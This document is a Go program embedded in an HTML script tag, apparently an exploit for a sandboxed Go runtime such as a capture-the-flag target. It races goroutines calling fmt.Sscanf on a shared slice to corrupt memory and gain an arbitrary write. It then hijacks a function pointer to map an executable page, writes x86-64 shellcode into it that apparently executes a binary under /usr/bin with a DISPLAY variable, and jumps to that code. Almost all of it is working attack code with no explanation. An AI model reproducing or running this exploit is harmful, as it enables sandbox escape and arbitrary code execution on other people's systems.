<script type="text/goscript">
package main

import "fmt"


const longstrSZ = 0x10000
const shortstrSZ = 0x1000
const candidateSZ = 0x21000
const ntries = 10
const offset = 0x08
const nrace = 0x340

type myarr []byte
type uintptr uint64

var ptr_arr_mod []**uintptr
var longstr string
var shortstr string
var stop uint8

type Ptr = uintptr

func fakemmap (addr Ptr, n uintptr, prot, flags, fd int32, off uint32) (p Ptr, err int) {
    return 0, 0
}

type ptrgroup struct {
    bb [0x100]byte
    ptr *uintptr
    val uintptr
    fptr func (addr Ptr, n uintptr, prot, flags, fd int32, off uint32) (p Ptr, err int)
    got uintptr
}
var target ptrgroup

var targetptr uintptr

func safescanf(s string, a *myarr) {
    defer func() {
            if r := recover(); r != nil {
        }
    }()
    fmt.Sscanf(s, "%s", a)
}

func change(ptr *myarr, c chan int) {
    for i:=0; stop == 0; i++ {
        var ptr2 myarr
        safescanf(longstr[:longstrSZ-9000], &ptr2)
        safescanf(shortstr, ptr)
        if i % 1000 == 0 {
            c <- 1
        }
    }
    for{}
}

func write(ptr *myarr, c chan int) {
    for i:=0; stop == 0; i++ {
        safescanf(longstr, ptr)
        if i % 1000 == 0 {
            c <- 1
        }
    }
    for{}
}

func scan(ptr *myarr) **uintptr {
    stop = 0
    c := make(chan int)
    go change(ptr, c)
    go write(ptr, c)
    for {
        <- c
        for i := 0; i < candidateSZ; i++ {
            if &target.ptr != ptr_arr_mod[i] {
                println("diff", &target.ptr, ptr_arr_mod[i])
                if targetptr == ptr2int(ptr_arr_mod[i]) {
                    stop = 1
                    return ptr_arr_mod[i]
                }
            }
        }
    }
}

func ptr2int(a interface{}) uintptr {
    s := fmt.Sprintf("%p", a)
    var v uintptr
    fmt.Sscanf(s[2:], "%x", &v)
    return v
}

func main() {
    target.val = 0xdeadbeef
    target.fptr = fakemmap
    target.got = 0x403560
    target.ptr = &target.got
    targetptr = ptr2int(&target.ptr)
    targetptr -= targetptr & 0xff
    targetptr += offset
    target.val = ptr2int(&target.fptr)

    //println(&target.val)

    longbytes := make([]byte, longstrSZ)
    for i:=0; i<longstrSZ; i++ {
        longbytes[i] = offset
    }
    longstr = string(longbytes)
    shortbytes := make([]byte, shortstrSZ)
    for i:=0; i<shortstrSZ; i++ {
        shortbytes[i] = offset
    }
    shortstr = string(shortbytes)
    var overwritter_slice []uint8
    for i:=0; i<20; i++ {
        overwritter_slice = make([]uint8, shortstrSZ)
        //println(overwritter_slice)
    }
    overwritter_slice = nil
    _ = overwritter_slice
    ptr_arr_mod = make([]**uintptr, candidateSZ)
    //println( ptr_arr_mod )
    for i := 0; i < candidateSZ; i++ {
        ptr_arr_mod[i] = &target.ptr
    }
    var myarrbuf myarr
    for i:=0; i<ntries; i++ {
        ptr := scan(&myarrbuf)
        if ptr != nil {
            //fmt.Printf("success %p\n", ptr)
            **ptr = ptr2int( &target.got )
            ptt , _ := target.fptr( 0x7000000 , 0x1000 , 7, 0x32 , -1, 0)
            //println( ptt , err )

            target.val = ptt
            
            **ptr =  0x2434810169722e68
            target.val += 8
            **ptr =  0x752fb84801010101
            target.val += 8
            **ptr =  0x48506e69622f7273
            target.val += 8
            **ptr =  0x810101313b68e789
            target.val += 8
            **ptr =  0xb848010101012434
            target.val += 8
            **ptr =  0x3d59414c50534944
            target.val += 8
            **ptr =  0x485a086a52d23150
            target.val += 8
            **ptr =  0xb848e2894852e201
            target.val += 8
            **ptr =  0x101010101010101
            target.val += 8
            **ptr =  0x626d606279b84850
            target.val += 8
            **ptr =  0x4824043148010101
            target.val += 8
            **ptr =  0x6e69622f727375b8
            target.val += 8
            **ptr =  0x1010101b848502f
            target.val += 8
            **ptr =  0x2eb8485001010101
            target.val += 8
            **ptr =  0x482e01622c016972
            target.val += 8
            **ptr =  0x73752fb848240431
            target.val += 8
            **ptr =  0xf631506e69622f72
            target.val += 8
            **ptr =  0x56e601485e176a56
            target.val += 8
            **ptr =  0x6a56e601485e1c6a
            target.val += 8
            **ptr =  0x894856e601485e18
            target.val += 8
            **ptr =  0x9090050f583b6ae6
            target.val += 8

            target.got = ptt
            target.fptr( 0x7000000 , 0x1000 , 7, 0x32 , -1, 0)

            return
        }
        //fmt.Println(i)
    }
    fmt.Println("main done")
}
</script>